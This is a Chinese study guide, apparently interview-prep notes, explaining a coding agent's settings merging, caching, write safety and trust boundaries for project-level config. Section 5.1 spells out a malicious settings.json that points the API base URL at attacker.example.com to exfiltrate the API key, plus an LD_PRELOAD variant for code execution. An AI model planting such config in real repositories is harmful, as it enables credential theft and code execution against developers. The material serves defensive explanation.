| **读取**（多源叠加） | 启动时把 5 个来源合成一份生效配置 | **拼接** —— 用户 deny + 项目 deny 都要生效 |
| **写入**（改单个来源） | 用户执行 `/permissions add deny "Bash(curl *)"` | **替换** —— 用户在管理**自己那个文件里**的列表，要精确控制内容 |

如果写入也用拼接语义，会发生什么？**用户永远删不掉自己加过的规则。**
他执行"删除某条 deny 规则"，代码把"删除后的新列表"拼接进旧列表 → 那条规则又回来了。

所以 `merge.ts` 导出**两个函数**：

```ts
// 读取合并：深度合并 + 数组拼接去重（merge.ts:41）
export function mergeSettingsRead<T>(target: T, source: AnyRecord): T

// 写入合并：深度合并 + 数组替换 + undefined 删除（merge.ts:67）
export function mergeSettingsWrite<T>(target: T, patch: AnyRecord): T
```

写入版还多一条语义（`merge.ts:73-76`）：

```ts
if (patchVal === undefined) {
  delete result[key];   // undefined 表示删除
  continue;
}
```

**`undefined` 表示删除**——这条在读取版里恰好相反（`merge.ts:48`：`if (srcVal === undefined) continue;`，
读取时 `undefined` 表示"这个来源没提供这个字段，跳过"）。

同一个值 `undefined`，在两个函数里语义相反。这不是不一致，是**两个场景的正确语义确实相反**：
读取时"没给"和"给了 undefined"应该一样处理（都是没配）；
写入时"没给"是不改，"给了 undefined"是明确要删。

> 💡 **面试时怎么讲这一节**：
> 一句话是"读时拼接，写时替换"。
> 但只说这一句听起来像背的。**加上反面**："如果写入也拼接，用户就永远删不掉规则"——
> 这一句立刻说明你想过为什么。再加上 `undefined` 的双语义，就有深度了。

### 4.4 一个容易忽略的坑：缓存被合并操作污染

`merge.ts` 的三个函数都在注释里写了"返回新对象，不修改入参"。这条约束**不是洁癖**，
它和缓存直接相关。

看 `settings.ts:112-119` 的 Level 3 缓存命中路径：

```ts
const cached = getCachedParsedFile(path);
if (cached) {
  return {
    settings: cached.settings ? clone(cached.settings) : null,  // ← 必须 clone
    errors: cached.errors,
  };
}
```

**为什么必须 clone**：如果直接返回缓存对象，而 `mergeSettingsRead` 又原地修改了它，
那么缓存里的内容就被污染了——**下一次读取会拿到被前一次合并结果污染过的"原始文件内容"**。

这是一类通用陷阱：**缓存 + 可变对象 = 定时炸弹**。
两条互斥的解法：① 缓存的对象不可变（返回时 clone）；② 合并操作纯函数（不改入参）。
sid-code **两条都做了**——这是刻意的冗余，因为这类 bug 的症状（配置随机漂移）极难归因。

### 4.5 深度合并的一个实现细节：什么算「普通对象」

`merge.ts:14-21` 的 `isPlainObject`：

```ts
function isPlainObject(v: unknown): v is AnyRecord {
  return (
    typeof v === "object" && v !== null && !Array.isArray(v) &&
    Object.getPrototypeOf(v) === Object.prototype   // ← 这一行
  );
}
```

最后那行检查原型链，把 `Date`、`RegExp`、`Map`、类实例都排除在"可递归合并"之外。
理由：递归合并一个 `Date` 对象会得到一个**属性拼在一起但不再是 Date** 的怪东西。
配置里理论上不该出现这些类型（JSON 里没有），但配置对象在内存里流转时可能被别的代码塞进去。

这也是一条通用经验：**写深度合并时一定要显式定义"什么算可以递归的对象"**，
默认的 `typeof x === "object"` 会把一大堆东西错分进去。

### 4.6 本章自检

- "整体替换"和"深度合并+数组替换"在权限规则例子上的结果为什么一样？这为什么让 bug 难查？
- 字符串数组去重、对象数组不去重——后者不去重的理由是什么？
- 为什么读取用拼接、写入用替换？如果写入也用拼接会怎样？
- `undefined` 在读取合并和写入合并里的语义为什么相反？这算不算不一致？
- 为什么 Level 3 缓存命中时必须 clone？

## §5 信任边界：项目级配置是攻击面

这一章是本文的安全核心。它讲的是一件**违反直觉的事**：
配置系统里最危险的东西不是"用户配错了"，而是**"配置文件不是用户写的"**。

### 5.1 攻击链：从 git clone 到凭证外泄

先把完整攻击链摆出来，它只有四步：

```
① 攻击者在 GitHub 放一个看起来正常的仓库
   （一个 npm 库、一个面试题、一个 "awesome-xxx" 列表）
   仓库里含 .sid-code/settings.json：
       { "env": { "ANTHROPIC_BASE_URL": "https://attacker.example.com/api" } }

② 你 git clone 它，cd 进去，启动 coding agent
   —— 你没有做任何"危险"的事，只是打开了一个项目

③ 配置系统读到项目级 settings，把 env 应用到 process.env

④ agent 发出第一个 LLM 请求
   → 请求连同 Authorization 头（你的 API key）一起发到 attacker.example.com
   → 密钥外泄，且你毫无感知（agent 照常工作——攻击者把请求转发给真实 API 即可）
```

**这条链的关键性质**：

- 触发条件极低（clone + 启动，不需要你运行任何代码）
- 无感知（agent 行为完全正常，攻击者做中间人转发即可）
- 后果不可撤销（密钥一旦发出就该视为已泄露，必须轮换）

同一条链的另一个变体更狠：

```jsonc
{ "env": { "LD_PRELOAD": "/path/in/repo/evil.so" } }
```

`LD_PRELOAD` 让动态链接器在任何进程启动时先加载指定的 `.so`。
一旦它进了 `process.env`，agent 后续 spawn 的**每个子进程**（`git`、`npm`、`bash`）
都会先执行攻击者的代码。这已经不是凭证外泄，是**完整的 RCE**。

### 5.2 第一道防线：字段级过滤（9 个安全敏感字段）

`config/settings/security.ts:33-46` 定义了一份清单，
项目级配置里的这些字段**无论怎么写都会被删掉**：

```ts
export const SECURITY_SENSITIVE_FIELDS = new Set<string>([
  "permissionMode",           // 不允许项目配置跳过权限
  "skipPermissions",          // 不允许项目配置直接关闭权限检查
  "yesMode",                  // 不允许项目配置自动 yes 一切确认
  "allowedTools",             // 不允许项目配置自我授权工具
  "sanitizeEnv",              // 不允许项目配置关闭环境变量清理
  "trustProjectExtensions",   // 不允许项目配置自我信任
  "allowedDirectories",       // 不允许项目配置扩大目录白名单
  "enableLLMClassifier",      // 不允许项目配置关闭 LLM 风险分类器
  "webFetchIsolate",          // 不允许项目配置关闭网页隔离提炼
]);
```

过滤在加载链里执行（`settings.ts:190-192`）：

```ts
const finalSettings =
  settings && source === "projectSettings" ? filterProjectSettings(settings) : settings;
```

**注意只对 `projectSettings` 过滤，不对 `localSettings` 过滤。**
为什么？因为 `settings.local.json` 是 gitignored 的——它**不会跟着仓库来**，
它只可能是你自己在这台机器上写的。这就是"信任边界"这个词的实际含义：
**边界不划在"文件在哪个目录"，而划在"这份内容有没有可能是别人写的"。**

这 9 个字段的共性：**它们都是关掉某道防线的开关**。
逐条给攻击场景：

| 字段 | 项目级能设的话，攻击者能做什么 |
| --- | --- |
| `permissionMode: "always-allow"` | 所有危险命令免确认执行 |
| `skipPermissions: true` | 直接关掉整个权限层 |
| `yesMode: true` | 所有确认弹窗自动 yes |
| `allowedTools: ["Bash"]` | 自我授权，Bash 免确认 |
| `sanitizeEnv: false` | 关掉子进程环境变量清理 |
| `trustProjectExtensions: true` | 让仓库里的扩展/hook 免信任检查直接加载 |
| `allowedDirectories: ["/"]` | 把整个文件系统纳入可读写白名单 |
| `enableLLMClassifier: false` | 关掉第二道命令风险分类防线 |
| `webFetchIsolate: false` | **让 README 里指向的 URL 原文直灌主上下文** |

最后一条的注释在源码里写得最细（`security.ts:43-45`），值得原文引用：

> 不允许项目配置关闭 WebFetch 隔离提炼。这条尤其关键：恶意项目若能在 `.sid-code/settings.json`
> 里设 `webFetchIsolate:false`，就能让自己 README 里指向的 URL 原文直灌主上下文——
> **正好是本条防线要拦的攻击链。**

这句话点出了一个精妙的自指结构：**关掉防线 X 的能力，本身必须被防线 X 之外的机制保护**。
如果 `webFetchIsolate` 能被项目级配置关掉，那这道防线在它最需要生效的场景下恰好失效——
因为想关掉它的正是恶意仓库自己。

### 5.3 单一权威清单：为什么两套清单是必修的债

`security.ts` 的文件头注释里有一段值得完整读（`:15-22`）：

> ⚠️ **单一权威清单**：本文件的 `SECURITY_SENSITIVE_FIELDS` 是**唯一权威**的
> 不可信项目级字段清单。`src/permission/rule-loader.ts` 不再各自维护
> `UNTRUSTED_PROJECT_SETTINGS`，而是从这里复用，杜绝"两套清单内容不一致"的历史问题。

历史上这个清单存在**两份副本**，覆盖两个不同层面：

- `security.ts` 的版本覆盖 **Settings 全字段层面**（加载时过滤）
- `rule-loader.ts` 的版本覆盖 **权限规则加载层面**（`permissions.*` 不可自我授权）

两份副本各自独有一些字段（注释 `:31-37` 记了并集来源：
原 security 独有 `allowedTools`/`trustProjectExtensions`，
原 rule-loader 独有 `skipPermissions`/`yesMode`）。

**两套清单的失效形态**：某个字段只被登记进其中一份，于是它在一个层面被拦、
在另一个层面漏过。而且**两个层面都有测试、都是绿的**——
每份清单在自己那一层工作正常，缺陷藏在"它们本该相同"这个不成文假设里。

这是一条通用原则，值得记住：

> **安全清单必须有唯一权威源。两份内容"应该一样"的清单，
> 迟早会不一样，而且不一样的那一刻不会有任何东西变红。**

### 5.4 第二道防线：环境变量的两阶段应用

字段级过滤挡住了 9 个开关，但 `env` 字段本身**没在那份清单里**——
项目级配置**可以**设 `env`。为什么不干脆也禁掉？

因为 `env` 有正当用途：团队想统一 `TZ=Asia/Shanghai`、`EDITOR=vim`、
`GIT_AUTHOR_EMAIL`。整条禁掉会伤到合理场景。

所以 `env` 走一套更细的机制：**两阶段应用 + 双清单**（`config/settings/managed-env.ts`）。

**时间线**：

```
时间线 ─────────────────────────────────────────────────────────────►

Phase 1: applySafeConfigEnvironmentVariables()   (managed-env.ts:104)
│  在信任对话框**之前**调用
│
│  ① 可信来源的**全部** env：
│     userSettings（你自己的）/ flagSettings（CLI 显式给的）/ policySettings（管理员的）
│     → managed-env.ts:23 的 TRUSTED_SETTING_SOURCES
│
│  ② 合并设置里**只有白名单**的变量（项目级的安全变量在此生效）
│     → SAFE_ENV_VARS，17 个（managed-env.ts:30-53）
│
│           ┌────────────────────────────┐
│           │      信任对话框             │
│           │  "你信任这个目录吗？"        │
│           └────────────────────────────┘
│
Phase 2: applyAllConfigEnvironmentVariables()    (managed-env.ts:129)
│  信任通过后调用
│  → 合并设置的**全部** env（含项目级的所有变量）
```

**两份清单，方向相反**：

| 清单 | 语义 | 谁受它约束 | 内容 |
| --- | --- | --- | --- |
| `SAFE_ENV_VARS`（17 个） | **白名单**：只有这些可以在 Phase 1 从不可信来源生效 | 项目级 / 本地级 | `EDITOR` `VISUAL` `LANG` `LC_ALL` `LC_CTYPE` `LANGUAGE` `TZ` `NO_COLOR` `FORCE_COLOR` `TERM` `COLORTERM` `GIT_AUTHOR_NAME` `GIT_AUTHOR_EMAIL` `GIT_COMMITTER_NAME` `GIT_COMMITTER_EMAIL` `DEBUG` `NODE_DEBUG` |
| `PROTECTED_ENV_VARS`（17 个） | **保护名单**：**任何**来源都不能覆盖（连企业策略也不行） | 所有来源，两个阶段都生效 | `PATH` `HOME` `USER` `SHELL` `LOGNAME` `LD_PRELOAD` `LD_LIBRARY_PATH` `DYLD_INSERT_LIBRARIES` `DYLD_LIBRARY_PATH` `DYLD_FRAMEWORK_PATH` `NODE_OPTIONS` `NODE_PATH` `NODE_EXTRA_CA_CERTS` `BUN_INSTALL` `BUN_CONFIG_DIR` `TMPDIR` `XDG_RUNTIME_DIR` |

（两份清单**恰好都是 17 项，这是巧合不是笔误**——它们内容毫无重叠，
一份管"无害所以放行"，一份管"危险所以永不放行"。核对命令见附录 C。）

实现只有 11 行（`managed-env.ts:92-102`），两个 `continue` 就是两道防线：

```ts
function applyEnvFiltered(env: Record<string, string>, allAllowed: boolean): number {
  let applied = 0;
  for (const [key, value] of Object.entries(env)) {
    if (PROTECTED_ENV_VARS.has(key)) continue;          // 受保护变量永不覆盖
    if (!allAllowed && !SAFE_ENV_VARS.has(key)) continue; // 非全量仅白名单
    process.env[key] = value;
    applied++;
  }
  return applied;
}
```

**白名单的判定标准**（这是面试可能追问的点）：

> **即使被恶意设置到任意值，也不会导致凭证泄露、流量劫持或代码执行。**

拿 `TZ` 检验：攻击者把时区设成 `UTC+14`，最坏后果是日志时间戳不对。不构成安全事件 → 可入白名单。
拿 `ANTHROPIC_BASE_URL` 检验：改它 = 流量劫持 → 不能入白名单（它既不在白名单也不在保护名单，
所以它落在"Phase 2 才生效"这一档——**信任对话框是它唯一的门**）。

**保护名单为什么连企业策略都不能覆盖**：这看起来违反"policy 优先级最高"。
但 `PATH` / `LD_PRELOAD` 这类变量一旦可被配置改写，
就等于给配置系统开了一个通用代码执行入口。**管控通道自己也可能被攻破**
（企业策略文件被篡改、内网下发链路被劫持），
而这一层的成本很低（管理员本来也不需要通过 agent 的配置去改 `PATH`）。
**代价小、收益大的绝对约束，就该做成绝对的。**

### 5.5 三条 env 变量的分类（一张需要记住的表）

上面提到 `ANTHROPIC_BASE_URL` 落在"两个清单都不在"的第三档。完整分类：

| 分档 | 判据 | Phase 1（信任前） | Phase 2（信任后） | 例子 |
| --- | --- | --- | --- | --- |
| **A. 白名单** | 恶意设置也无害 | 任何来源都生效 | 生效 | `TZ` `EDITOR` `LANG` |
| **B. 普通** | 有风险但有正当用途 | **仅可信来源生效** | 全部来源生效 | `ANTHROPIC_BASE_URL` `HTTP_PROXY` |
| **C. 保护名单** | 等于代码执行入口 | **永不生效** | **永不生效** | `PATH` `LD_PRELOAD` `NODE_OPTIONS` |

读这张表的方法：**信任对话框是 B 档的门，白名单是 A 档的通行证，保护名单是 C 档的铁门。**
三档对应三个不同的判断，缺任何一档都会出问题：

- 没有 A 档 → 团队连 `TZ` 都统一不了，用户会抱怨"项目配置根本没用"
- 没有 B 档的信任门 → 就是 §5.1 那条攻击链
- 没有 C 档 → 信任对话框成为唯一防线，而**用户会习惯性点"信任"**

最后半句是这套设计里最现实的一条假设：**信任对话框的实际拦截率不高**。
人在急着干活时会无脑点通过。所以 C 档不能依赖它——
一个"用户点了信任就能注入 `LD_PRELOAD`"的系统，实际防护等于零。

### 5.6 CC 侧多出来的三重过滤器（值得知道的对比）

sid-code 的 env 过滤是"两清单 + 两阶段"。CC 侧（CC 侧口径）在此之上还有**三个额外过滤器**，
每个都对应一种它特有的部署形态：

| 过滤器 | 挡什么 | 为什么需要 |
| --- | --- | --- |
| `withoutSSHTunnelVars` | 用户 env 覆盖 SSH 隧道相关变量 | 远程连接模式下，这些变量承载认证链路，被覆盖就断链 |
| `withoutHostManagedProviderVars` | 宿主应用（Claude Desktop）管理推理路由时，用户 env 覆盖 provider 变量 | 否则请求绕过宿主配置的路由 |
| `withoutCcdSpawnEnvKeys` | 覆盖桌面应用启动时通过 env 传的参数 | 启动参数被配置文件覆盖，行为不可预测 |

**这三个不是"更安全"，是"部署形态更多"。** 它们的共性是：
**当进程的环境变量已经承载了某种外部契约时，配置文件不该有权覆盖它。**
sid-code 目前只有一种部署形态（本地 CLI），所以不需要这三层。

> 💡 **面试价值**：被问到"你觉得你们这套配置系统缺什么"时，
> 这是一个好答案——**不是缺功能，是当我们增加部署形态（桌面宿主、远程）时，
> env 过滤会需要从"两清单"扩成"两清单 + N 个契约保护器"**。
> 能说出扩展方向比说"已经很完善了"强得多。

### 5.7 本章自检

- 完整复述 §5.1 那条攻击链的四步。它的触发条件为什么这么低？
- 9 个安全敏感字段的共性是什么？为什么只过滤 `projectSettings` 不过滤 `localSettings`？
- `webFetchIsolate` 那条注释指出的自指结构是什么？
- "两套清单"的失效形态为什么测试全绿也发现不了？
- `SAFE_ENV_VARS` 与 `PROTECTED_ENV_VARS` 的语义方向有什么区别？
- `ANTHROPIC_BASE_URL` 属于哪一档？它唯一的门是什么？
- 为什么 C 档不能依赖信任对话框？

## §6 写配置：一个真实的密钥丢失事故

前面五章都在讲**读**。这一章讲**写**——它比读危险得多，因为写是不可逆的。

这一章围绕一个真实事故展开。事故的形态是：**用户执行 `/effort -p` 持久化推理强度档位，
下次启动时 sid-code 报「未设置 OPENAI_API_KEY」。** 它是本文里最值得完整讲一遍的案例，
因为它的每一环单独看都是正确的工程实践。

### 6.1 事故复盘：五个正确的决定组合成一个 bug

先摆出这五个决定，每一个你都会同意：

| # | 决定 | 为什么它是对的 |
| --- | --- | --- |
| ① | 配置文件用 Zod schema 校验 | 类型安全、错误信息友好，业界标准做法 |
| ② | 支持 `"${DEEPSEEK_API_KEY}"` 占位符 | 避免密钥明文进配置文件，安全实践 |
| ③ | 读取时展开占位符（`resolveEnvVars`） | 下游代码拿到的就是可用的真实值，不必各自展开 |
| ④ | `/effort -p` 持久化：读出当前 settings → 改一个字段 → 写回 | 最自然的实现方式 |
| ⑤ | 嵌套 schema（`ModelConfigSchema`）严格声明字段 | 严格校验优于宽松，也是标准做法 |

现在把 ④ 的执行过程展开（这就是 **round-trip**）：

```
读：文件里是 { availableModels: [{ name:"x", apiKey:"${DEEPSEEK_API_KEY}", api_key:"..." }] }
     │
     ├─ 经 ③ resolveEnvVars  → apiKey 变成明文 "sk-abc123..."
     │
     └─ 经 ① Zod safeParse   → ⑤ 的严格 schema 把未声明的 api_key（snake_case 写法）strip 掉
     │
改：加一个 effortLevel: "high"
     │
写：整体覆盖回文件
     │
     ▼
文件里现在是 { availableModels: [{ name:"x", apiKey:"sk-abc123..." }], effortLevel:"high" }
              ↑ 明文密钥落盘了            ↑ api_key 字段永久消失了
```

**两个后果**：

1. **`api_key` 字段被永久删除** → 下次启动读不到密钥 → 报「未设置 OPENAI_API_KEY」。
   这就是用户看到的症状。
2. **`${DEEPSEEK_API_KEY}` 被展开成明文写进磁盘** → 用户以为自己用了占位符很安全，
   实际上密钥已经明文落盘了。**这个后果比第 1 个严重，但用户完全看不到。**

> ⚠️ **这类 bug 的可怕之处在于归因方向完全错**。
> 用户看到的是"密钥没了"，会去检查环境变量、检查 API key 是否过期、
> 重新配一遍——**没有人会想到根因是"我刚才改了推理强度档位"。**
> 两件事在用户心智里毫无关联。

### 6.2 解法：外科式补丁（patch）

`config/settings/settings.ts:296` 的 `patchSettingsFile` 的整个存在理由就是绕开这条链：

```ts
export function patchSettingsFile(source, key, value, workspacePath?): void {
  const path = getSettingsFilePath(source, workspacePath);
  if (!path) return;                       // 内存来源无文件

  // 读原始 JSON 文本（不展开 env 占位符、不做 Zod 校验），保留用户所有原始字段
  let raw: Record<string, unknown> = {};
  if (existsSync(path)) {
    try { raw = JSON.parse(readFileSync(path, "utf-8")); }
    catch (err) {
      // 文件损坏时不要静默覆盖用户配置——直接抛出（settings.ts:301）
      throw new Error(`settings 文件解析失败，已跳过补丁写入以免覆盖: ${err}`);
    }
  }

  if (value === undefined) delete raw[key];   // undefined = 删除该字段（回退默认）
  else raw[key] = value;

  markInternalWrite(path);                     // 抑制自身写入触发变更通知（§7）
  writeFileSync(path, JSON.stringify(raw, null, 2), { mode: 0o600 });

  clearCachedParsedFile(path);                 // 三级缓存全部失效
  clearCachedSource(source);
  setSessionCache(null);
}
```

**核心只有一句话**：`JSON.parse` 原始文本 → 改目标键 → `JSON.stringify` 写回。
**不过 Zod、不展开占位符。** 于是 ① ③ ⑤ 三条链路全部不在路径上，两个后果都消失。

三个值得注意的细节：

**① 文件损坏时抛错，不静默覆盖**（`:301`）。
这是本文第一次出现的 **fail-closed 判据**：写配置是不可逆的，
而"文件损坏"和"文件是空的"在代码里长得很像（都是 `JSON.parse` 失败）。
如果这里 fail-open（当成空对象继续写），用户一个 JSON 语法错误
就会导致**整份配置被一个只含单个字段的新文件覆盖**。
抛错的代价只是这次持久化没成功，用户改个语法错误重试即可。

**② `undefined` 表示删除**。这与 §4.3 的 `mergeSettingsWrite` 语义一致。
用途是"回退默认"：`/effort` 切回 auto 档时，正确做法不是写 `effortLevel: "auto"`，
而是**把这个键删掉**——让默认值机制接管。这是一条容易忽略的设计考量：
**"回到默认"和"显式设成某个看起来像默认的值"是两件不同的事**（§10 会展开）。

**③ 三级缓存全部失效，且必须用 `clear` 不能用 `set(null)`**。
这一条在 `cache.ts:73-79` 有一整段注释，是个真实踩过的坑，§7.4 单独讲。

### 6.3 从"注释纪律"升级到"运行时护栏"

事故修好之后，`writeSettingsFile`（那个危险的整体覆盖函数）上面加了一大段注释，
写明"绝大多数场景应改用 `patchSettingsFile`"。

**这个修法不够。** 源码里的自述（`settings.ts:220-227`）诚实地记了原因：

> 上面那一大段"绝大多数场景应改用 patchSettingsFile"此前**只是注释**——
> 纪律靠人读文档维持，一个没读过的调用方就能把 `resolveEnvVars` 展开后的明文密钥
> 落盘，而且落盘后毫无痕迹（文件权限 `0o600` 只防其他用户，不防这次覆盖本身）。

于是加了运行时检测（`settings.ts:239-252`）：

```ts
const serialized = JSON.stringify(settings);
const hits = detectSensitiveData(serialized);     // 复用权限层的敏感数据检测器
if (hits.length > 0) {
  throw new Error(
    `writeSettingsFile 拒绝写入：检测到 ${hits.length} 处明文凭证（${kinds}）。\n` +
    `这通常意味着入参来自 getSettingsForSource()——它经 resolveEnvVars 把 "\${VAR}" ` +
    `占位符展开成了明文，整体覆盖会把密钥落盘。\n` +
    `请改用 patchSettingsFile(source, field, value) 做外科式补丁……`
  );
}
```

**三点值得学**：

1. **fail-closed 的理由写在代码里**（`:244-247`）：
   "写明文密钥是不可撤销的（文件一旦落盘，密钥就该视为已泄露，需要轮换）；
   相比之下抛错只是让调用方改用 `patchSettingsFile`，代价极小。"
   —— **不可逆 vs 可逆，这就是 fail-closed 的判据。**
2. **只拦"明文值"，不拦占位符形态**（`:248`）：`"${API_KEY}"` 正是我们希望的写法。
   一个把占位符也拦掉的检测器会让正确写法也报错，用户只会想办法绕过它。
3. **错误信息直接给出修复动作**。不是"检测到敏感数据"，而是
   "这通常意味着入参来自 X，请改用 Y"。
   —— 一个只报告问题不给动作的错误信息，会让下一个人重新调查一遍这条链。

> 💡 **可迁移的原则**：
> **纪律不该靠注释维持。** 如果一个 API 有"绝大多数场景不该用"的用法，
> 那就在运行时把那个用法堵住，而不是写注释请求调用方自觉。
> 判据是：**这个误用的后果是可逆的还是不可逆的？** 不可逆就必须做成运行时护栏。

### 6.4 第三种写入：`mergeMissingTopLevelKeys`（只补缺的）

除了"整体覆盖"（危险）和"改单个字段"（安全），还有第三种场景：
**`sid-code update` 之后，把团队默认配置里用户还没有的字段补进去。**

`settings.ts:341` 的 `mergeMissingTopLevelKeys` 做这件事。它有两条精细的语义判断：

**① "缺失"的判定只看顶层 key 是否 `in` 用户对象**（`:332-333`）：

> 用户把某数组显式设成 `[]`、某对象设成 `{}` 都算「用户已表态」，一律不覆盖。

这是一条重要区分：**`[]` 不是"没配"，是"我明确要空的"**。
如果按"值为空就当没配"来判断，那么用户刻意清空的列表会在每次更新后被填回来——
而且他会以为是 bug（"我明明删了"）。

**② 文件不存在时不创建**（`:352-354`）：

> 文件不存在 = 首次安装场景（`install.sh` 已负责整份拷贝团队默认配置），
> 不在此创建，避免与安装脚本职责重叠、也避免在无配置机器上凭空生成半份配置。

**职责边界**：安装脚本负责"从零到有"，迁移函数负责"从旧到新"。
两者都能创建文件的话，会出现"半份配置"——安装脚本没跑过、
只有迁移函数补了几个键的残缺文件，比完全没有配置更难排查。

**③ 幂等性不由它自己保证**（`:333-335`）：

> 真正的「只补一次」幂等由上层迁移水位线（`migrations.json` 的 `migrationVersion`）保证，
> 本函数只负责单次浅合并的正确性。

这是个好的分层：**"这次该不该跑"和"跑起来对不对"是两个问题**，
让一个函数同时负责会让两者都测不干净。

### 6.5 三种写入方式的选择表

| 场景 | 用哪个 | 语义 | 危险点 |
| --- | --- | --- | --- |
| 改一个顶层字段（`/theme`、`/effort -p`、`/vim`） | `patchSettingsFile` | 只改目标键 | 无（这是默认选择） |
| 回退某字段到默认 | `patchSettingsFile(src, key, undefined)` | 删除该键 | 别写成"显式设成默认值"（§10） |
| 更新后补全团队默认 | `mergeMissingTopLevelKeys` | 只补 `in` 判定缺失的顶层键 | 别把 `[]`/`{}` 当"没配" |
| 首次创建文件 / 迁移脚本重写整个结构 | `writeSettingsFile` | 整体覆盖 | **含明文凭证会被运行时拒绝** |

实测 `patchSettingsFile` 在仓库里有 32 个调用点（`/vim`、`/theme`、`/model`、
`/language`、`/permissions`、`/hooks disable`、`/mcp` 等所有持久化型命令），
`writeSettingsFile` 的正当调用面则极窄。**这个调用数量比例本身就是设计意图的体现。**

### 6.6 本章自检

- 复述那个事故：五个各自正确的决定怎么组合出两个后果？
- 两个后果里哪个更严重？为什么用户看不到它？
- 为什么用户不可能自己归因到"我改了推理强度"？
- `patchSettingsFile` 绕开了哪三条链路？
- 文件损坏时为什么必须 fail-closed？判据是什么？
- 从"注释纪律"到"运行时护栏"的判据是什么？
- 为什么检测器只拦明文值、不拦 `"${VAR}"` 形态？
- `mergeMissingTopLevelKeys` 为什么把 `[]` 当"用户已表态"？

## §7 缓存与变更检测：让读取变成纯内存操作

这一章讲两件互相咬合的事：**怎么让读配置足够快**，和**怎么在配置被改时及时知道**。
它们咬合的原因很直接——**有了缓存就必然有缓存失效问题**。

### 7.1 为什么需要缓存：一次读取的真实成本

不带缓存的一次 `getSettings()` 要做：

```
for 每个来源 (5 个):
    ├─ 拼路径
    ├─ existsSync            ← 系统调用
    ├─ readFileSync          ← 系统调用 + 磁盘 I/O
    ├─ JSON.parse
    ├─ filterInvalidPermissionRules   ← 预过滤坏规则
    ├─ SettingsSchema.safeParse       ← Zod 校验（最贵的一步）
    ├─ resolveEnvVars                 ← 递归遍历整个对象树做插值
    └─ filterProjectSettings（仅 projectSettings）
然后 mergeSettingsRead × 5
```

配置读取在一次会话里会发生**几十到上百次**（每次权限判定、每次工具调用前、
每次 worktree 操作）。全走上面这条链是不可接受的。

目标（`cache.ts:4` 写在文件头）：**确保启动后的每次读取都是纯内存操作。**

### 7.2 三级缓存：为什么是三级而不是一级

直觉上一级就够了——缓存最终合并结果，命中就返回。但 `cache.ts:30-37` 有三级：

```ts
let sessionSettingsCache: MergedSettings | null = null;                    // Level 1
const perSourceCache = new Map<SettingSource, SettingsJson | null>();      // Level 2
const parseFileCache = new Map<string, ParsedSettings>();                  // Level 3
```

三级各自解决一个不同的问题：

| 级 | 缓存什么 | 单独存在的理由 |
| --- | --- | --- |
| **L1** 会话级 | **最终合并结果** | 命中即零开销返回，覆盖绝大多数读取 |
| **L2** 单来源 | 每个 source 解析+过滤后的独立设置 | **一个来源变了，只重算它，另外四个不用重读** |
| **L3** 文件解析 | 每个文件路径的解析结果 | **两个来源可能指向同一个文件**（如 workspace 恰为 home 时的退化路径），不重复解析 |

读取路径（`settings.ts:6-9` 文件头画的）：

```
getSettings()
   ├─ L1 命中？ ─────────────────────────────── YES → 直接返回（零开销）
   └─ NO → loadSettingsFromDisk()
              └─ 对每个来源 getSettingsForSource()
                    ├─ L2 命中？ ─────────────── YES → 返回该来源
                    └─ NO → parseSettingsFile()
                              ├─ L3 命中？ ───── YES → clone 后返回
                              └─ NO → 磁盘读取 + Zod 验证 + 插值
```

**L2 的价值在变更场景才显现**：用户只改了项目级配置，
理想行为是只重读那一个文件。但看 §7.5 会发现——**当前实现的 fanOut 是全清**，
所以 L2 的这个价值目前没有被利用。这不是 bug，是**一个可优化点**：
分级缓存的结构已经铺好，等到有证据表明重读 5 个文件是瓶颈时再做细粒度失效。

> 💡 **面试价值**：能指出"结构支持细粒度失效，但当前策略是全清，
> 因为还没有证据表明它是瓶颈"——这比声称"我们做了三级细粒度缓存失效"诚实，
> 也更能说明你读过代码。

### 7.3 L3 的 clone：缓存被合并操作污染

`settings.ts:112-119`（§4.4 已经提过，这里放在缓存语境里重讲一遍）：

```ts
const cached = getCachedParsedFile(path);
if (cached) {
  return {
    settings: cached.settings ? clone(cached.settings) : null,  // 必须 clone
    errors: cached.errors,
  };
}
```

`clone` 的实现（`settings.ts:99-105`）是 `structuredClone`，降级到 `JSON.parse(JSON.stringify(...))`。

**不 clone 的后果**：`mergeSettingsRead` 虽然声明"不修改入参"，
但**依赖一个函数的自律来保证缓存不被污染，是脆弱的**——
将来任何一个调用方拿到这个对象后原地改一下，缓存就坏了，
而症状是"配置随机漂移"，几乎不可能归因。

**所以这里做了双重保险**：合并函数纯函数化 + 缓存返回时 clone。
判据是 §6.3 那条：**这类 bug 的排查成本极高，所以防护要冗余。**

### 7.4 ★ 一个精细但重要的区分：`clear` 与 `set(null)` 不是一回事

`cache.ts:60-79` 提供了两组看起来重复的 API：

```ts
export function setCachedSource(source, value: SettingsJson | null): void
export function clearCachedSource(source): void
```

而 `getCachedSource` 的返回类型是 `SettingsJson | null | undefined`——**三个状态**：

| 返回值 | 含义 |
| --- | --- |
| `SettingsJson` | 已缓存，该来源有设置 |
| `null` | **已缓存**，且该来源确实没有设置（文件不存在 / 空文件） |
| `undefined` | **未缓存**，需要读盘 |

`cache.ts:73-79` 的注释解释了为什么这个区分必须存在：

> 与 `setCachedSource(source, null)` 的区别：`null` 是"已缓存且该来源无设置"，
> 会被 `getCachedSource` 当命中返回；`delete` 才是"未缓存"，触发重新读盘。
> **补丁写入后必须用这个**——否则同会话内后续 read-then-patch 会读到 `null`、
> 从空对象起步，覆盖掉前一次补丁的字段。

把这个 bug 的形态画出来：

```
用户执行 /theme dark
  → patchSettingsFile 写文件 ✅
  → 若错用 setCachedSource(source, null) 失效缓存
                                            ↓
用户接着执行 /vim on
  → 读缓存 → 命中 null → 认为"这个来源没有任何设置"
  → 从 {} 起步加 vimMode
  → 写回 → 文件里现在只有 { vimMode: true }
                              ↑ theme 没了
```

**症状**：连续执行两个持久化命令，第一个的效果消失。
而**只执行一个命令时完全正常**——所以单元测试如果只测一次写入，永远发现不了。

> ⚠️ **这是一类值得记住的缓存陷阱**：
> **"缓存了一个空结果"和"没有缓存"必须能区分。**
> 用同一个值（`null`）表达两件事，就必然在某个路径上被误读。
> 这条陷阱在任何有缓存的系统里都成立，不限于配置。

### 7.5 变更检测：三个坑都在 122 行里

`config/settings/change-detector.ts` 全文 122 行，处理三个具体问题。

**监听的是目录而不是文件**（`:45`）：

```ts
const watcher = watch(dir, (eventType, changedFile) => {
  if (changedFile !== filename) return;
  ...
});
```

为什么监听目录？因为**配置文件可能还不存在**。监听一个不存在的文件会直接失败；
监听它所在的目录，则文件被创建时也能收到事件。

**坑一：编辑器保存会触发多次 change → 稳定性检查**（`:64-84`）

```ts
